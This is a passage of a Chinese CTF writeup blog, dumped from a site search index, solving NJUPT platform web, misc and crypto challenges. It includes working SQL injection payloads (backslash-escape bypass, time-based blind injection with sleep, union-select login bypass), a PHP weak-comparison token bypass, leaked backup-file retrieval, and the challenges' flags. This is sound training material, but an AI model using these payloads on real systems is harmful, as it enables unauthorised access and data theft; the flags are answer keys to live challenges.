访问http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password=%20or%201%23， 也就是构造payload为?username=\&amp;password=%20or%201%23 ，使得查询语句如下： SELECT * FROM users WHERE name='\' AND pass='%20or%201%23'即SELECT * FROM users WHERE name='\' AND pass=' 『 [name]的值为 [' AND pass=] ，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真』 #' 『 注释掉多余的单引号 』即select * from users where false or 1 附： ​ 具体编码方式可使用 print_r(get_html_translation_table($table =HTML_ENTITIES,$flags=ENT_QUOTES))查看， `ENT_COMPAT ENT_HTML401` ENT_QUOTES [&amp;] =&gt; &amp;amp; [&amp;] =&gt; &amp;amp; [&quot;] =&gt; &amp;quot; [&quot;] =&gt; &amp;quot; [&lt;] =&gt; &amp;lt; [&#39;] =&gt; &amp;#039; [&gt;] =&gt; &amp;gt; [&lt;] =&gt; &amp;lt; … [&gt;] =&gt; &amp;gt; 共100个 共101个 综合题nctf{bash_history_means_what} 1、访问链接得到一大段jsfuck代码，解码后得到document.write(&quot;1bc29b36f623ba82aaf6724fd3b16718.php&quot;) ; 2、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在HTTP响应头得到提示tip:history of bash; 3、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history ，看到页面内容为zip -r flagbak.zip ./* ; 4、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip 得到flag。 sql 注入2 注入第二题~~主要考察union查询传送门:点我带你飞 ntcf{union_select_is_wtf} index/phps中有源码如下 &lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo "&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"; &#125; else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125;&#125;?&gt; 因为 var_dump(!strcasecmp(array(), $query[pw]));//bool(true)var_dump(!strcasecmp(md5(array()), $query[pw]));//bool(false) 所以没法用把pass作为数组传进去的伎俩。另外虽然第七行的$user处存在注入，但输出没有回显。想到基于时间延迟的盲注。主要用到三个函数，mid()，if()和sleep()： MID(str,pos,len)/*需注意pos从1而不是0开始，Return a substring starting from the specified position*/IF(expr1,expr2,expr3)/*If expr1 is TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL), IF() returns expr2. Otherwise, it returns expr3.*/SLEEP(duration)/*Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0.If SLEEP() is interrupted, it returns 1. The duration may have a fractional part.*/ 所以构造post数据 user=admin' and if(mid(pw,1,1)&gt;'9',sleep(2),1)#&amp;pass=blabla 如果if()函数的expr1正确，页面响应就会延时两秒，否则不会，以此为依据采用二分法调整。 pw字段的取值范围为/[\da-e]/， 最后注处字段值为21dd715a3605b2a4053e80387116c190，即md5(&#39;njupt&#39;) 然后postuser=admin&amp;pass=njupt即可。 index.phps藏源码。 &gt; 查到另一种简单的做法，即post如下数据&gt; user=&apos; union select &apos;45cf93bd4f762c6597b68e615b153bd0&apos;#&amp;pass=findneo&gt; 其中&apos;45cf93bd4f762c6597b68e615b153bd0&apos;即md5(&apos;findneo&apos;)&gt; &gt; 这才是出题者的本意。我觉得这个做法很妙，看似理所当然的代码逻辑实际上不堪一击。 综合题2 非xss题 但是欢迎留言~地址：get the flag flag:nctf{you_are_s0_g00d_hacker} 详见南邮CTF平台综合题2writeup 注入实战一 请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉）目标网址：地址flag为管理员密码的32位md5(小写)并且加上nctf{} 手注教程群里面发过。看不懂的话自行百度”mysql手动注入”查阅相关文章 PS:用sqlmap等工具做的就不要厚脸皮提交了 题目貌似坏了，放个 4ct10n 的解答吧。 密码就在上图BSCmarketing24然后再md5加密成 f3d6cc916d0739d853e50bc92911dddbflag: nctf{f3d6cc916d0739d853e50bc92911dddb} 密码重置2 题题被秒，当时我就不乐意了！本题来源于CUMT题目链接 TIPS:1.管理员邮箱观察一下就可以找到2.linux下一般使用vi编辑器，并且异常退出会留下备份文件3.弱类型bypass nctf{thanks_to_cumt_bxs} 1、按照提示，源码中看到管理员邮箱为admin@nuptzj.cn ； 2、wget http://nctf.nuptzj.cn/web14/.submit.php.swp ； 3、 if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "失败了呀"; &#125;&#125; 要求token长度为10且token!=&#39;0&#39;为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以&#39;0e123&#39;==&#39;0&#39;值为真）绕过，访问 http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678 即可。 MISC图种 flag是动态图最后一句话的拼音首字母加上nctf{} nctf{dssdcmlw} binwalk -e 555.gif分离出一张233333.gif，动态图的最后一帧的最后一句话是 都深深的出卖了我 丘比龙De女神 丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！ 没错 里面隐藏了一张女神的照片flag是照片文件的md5值(小写)记住加上flag{} 文件尾有nvshen.jpg字样，故搜索字符串nvshen，共出现两次，猜测从第一次出现位置上方的love起到文件末尾为一个密码为love的压缩包，复制出来后修改6C6F7665 为504b0304 ,解压得到女神的照片。 flag{a6caad3aaafa11b6d5ed583bef4d8a54} 密码学easy! 密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9这题做不出来就剁手吧！ nctf{this_is_base64_encode} 在Linux命令行输入echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 | base64 -d即可 keyboard 看键盘看键盘看键盘！答案非标准格式，提交前加上nctf{}ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm 观察题干字符串在键盘上的位置构成的轨迹。 nctf{areuhack} base64全家桶 全家桶全家桶全家桶！我怎么饿了。。。。。。密文(解密前删除回车)： R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVkzREVOUlJHNFpUTU5KVEdFWlRNTjJF 按base64、base32、base16的顺序解码一遍即可。 nctf{base64 _ base32_and_base16} n次base64import base64 as bs='**'while 1: s=b.b64decode(s) print s nctf{please_use_python_to_decode_base64} 骚年来一发吗 密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas &gt; function encode($str)&#123;&gt; $_o=strrev($str);&gt; for($_0=0;$_0&lt;strlrn($_o),$_0++)&#123;&gt; $_c=substr($_o,$_0,1);&gt; $__=ord($_c)+1;&gt; $_c=chr($__);&gt; $_=$_.$_c;&gt; &#125;&gt; return str_rot13(strrev(base64_encode($_)));&gt; &#125;&gt; encode函数先反转明文字符串，再逐字符加一，然后base64编码，再反转，再rot13，然后返回加密后的字符串。 &lt;?php$s="iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas";function decode($str)&#123; $strtmp=base64_decode(strrev(str_rot13($str))); $res=''; for($i=0;$i&lt;strlen($strtmp);$i++)&#123; $res.=chr(ord(substr($strtmp, $i,1))-1); &#125; return strrev($res);&#125;echo decode($s); nctf{rot13and_base64and_strrev} mixed base64 多重base64加密，干(sang)得(xin)漂(bing)亮(kuang)! &gt; import random&gt; from base64 import *&gt; result=&#123;&gt; '16':lambda x:b16encode(x),&gt; '32':lambda x:b32encode(x),&gt; '64':lambda x:b64encode(x)&gt; &#125;&gt; flag=b"&#123;nctf&#123;***&#125;"&gt; for i in range(10):&gt; a=random.choice(['16','32','64'])&gt; flag=result[a](flag)&gt; with open("code.txt",'wb')as f:&gt; f.write(flag)&gt; 解码代码： from base64 import b64decode, b32decode, b16decodewith open('code.txt', 'r') as f: c = f.read()def trys(s): for f in [b64decode, b32decode, b16decode]: try: t = f(s) if t[:4] == "nctf": print t return 0 else: trys(t) except: passtrys(c) nctf{random_mixed_base64_encode} 异性相吸 同性真爱，异性相吸都是假的！（题目要求，我是直的） 解密压缩文件里的内容 TIPS:1.xor2.hex2binary3.len(bin(miwen))==len(bin(mingwen)) c=open('密文.txt').read()p=open('明文.txt').read()s=''for i in range(len(c)): s+=chr(ord(c[i])^ord(p[i]))print s nctf{xor_xor_xor_biubiubiu} MD5 python大法好！这里有一段丢失的md5密文e9032???da???08????911513?0???a2要求你还原出他并且加上nctf{}提交 已知线索 明文为： TASC?O3RJMV?WDJKX?ZM 题目来源：安恒杯 import hashlibpool = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ's0 = 'TASC?O3RJMV?WDJKX?ZM'ss = s0.split('?')m = 'e9032???da???08????911513?0???a2'for i in pool: for j in pool: for k in pool: s = ss[0] + i + ss[1] + j + ss[2] + k + ss[3] if hashlib.md5(s).hexdigest()[:5] == m[:5]: print s, hashlib.md5(s).hexdigest() break nctf{e9032994dabac08080091151380478a2} Vigenere It is said that Vigenere cipher does not achieve the perfect secrecy actually :-) Tips:1.The encode pragram is given;2.Do u no index of coincidence ？3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction) http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp#include &lt;stdio.h&gt;#define KEY_LENGTH 2 // Can be anything from 1 to 13main()&#123; unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = &#123;0x00, 0x00&#125;; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen("ptext.txt", "r"); fpOut = fopen("ctext.txt", "w"); i=0; while (fscanf(fpIn, "%c", &amp;ch) != EOF) &#123; /* avoid encrypting newline characters */ /* In a "real-world" implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create "production-quality" code =) */ if (ch!='\n') &#123; fprintf(fpOut, "%02X", ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; &#125; &#125; fclose(fpIn); fclose(fpOut); return;&#125; ----------------------------------------------------------------------------------http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txtF96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 详见 南邮CTF平台 Vigenere writeup 。]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[about]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[联系我 email: dfindneo@gmail.com 朋友们 Chybeta: https://chybeta.github.io/ lzhtony: https://lxpark.com/ Mads: https://blog.madsome.cn/]]></content>
  </entry>
  <entry>
    <title><![CDATA[categories]]></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[tags]]></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
</search>
